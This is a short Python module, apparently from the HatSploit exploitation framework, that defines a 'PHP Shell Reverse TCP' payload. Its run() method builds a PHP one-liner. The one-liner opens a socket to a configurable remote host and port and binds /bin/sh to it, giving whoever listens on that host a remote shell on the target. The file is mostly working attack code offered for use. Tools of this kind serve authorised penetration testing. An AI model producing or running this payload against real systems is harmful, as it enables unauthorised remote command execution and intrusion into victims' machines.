"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, ReverseTCPHandler):
    def __init__(self):
        super().__init__({
            'Name': "PHP Shell Reverse TCP",
            'Payload': "unix/generic/php_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "PHP shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
        })

    def run(self):
        payload = (
                f"php -r '$sock=fsockopen(\""
                + self.rhost.value
                + "\","
                + self.rport.value
                + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        )
        return payload
